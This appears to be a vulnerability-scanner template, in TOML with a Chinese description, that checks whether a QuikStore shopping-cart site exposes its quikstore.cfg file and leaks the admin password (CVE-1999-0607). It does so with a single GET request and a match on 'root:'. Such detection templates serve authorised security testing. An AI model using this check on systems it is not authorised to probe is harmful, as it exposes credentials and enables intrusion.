[info]
author = "ave"
description = "验证 QuikStore 购物车系统的 quikstore.cgi 配置文件是否暴露在 Web 根目录下，导致管理员密码泄露"
id = "POC-AVE-1999-0178"
name = "CVE-1999-0607 购物车配置信息泄露验证"
severity = "high"
tags = ["ave-1999-0178"]
vuln_id = [
    "CVE-1999-0607",
    "AVE-1999-0178",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/quikstore.cfg"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
